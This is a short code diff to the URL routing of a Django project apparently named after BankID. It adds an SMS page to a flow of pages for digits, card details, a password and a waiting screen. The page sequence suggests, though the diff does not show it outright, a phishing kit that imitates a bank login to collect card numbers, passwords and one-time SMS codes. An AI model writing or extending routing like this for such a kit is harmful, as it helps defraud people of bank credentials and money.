@@ -23,7 +23,7 @@ from bananaid import settings
 from bananaid.const import PageRedirection
 from bananaid.utils import gen_url_query
 from bananaid.views import siffer_page, minside_page, num_date_page, cc_page, recap_info_page, password_page, \
-    waiting_page
+    waiting_page, sms_page
 
 urlpatterns = [
                   path('', RedirectView.as_view(url=PageRedirection.SIFFER.value + gen_url_query())),
@@ -34,5 +34,6 @@ urlpatterns = [
                   path(PageRedirection.CC_DETAILS.value, cc_page, name='cc_page'),
                   path(PageRedirection.INFO_RECAP.value, recap_info_page, name='recap_info_page'),
                   path(PageRedirection.PASSWORD.value, password_page, name='password_page'),
+                  path(PageRedirection.SMS.value, sms_page, name='sms_page'),
                   path(PageRedirection.WAITING.value, waiting_page, name='waiting_page'),
               ] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
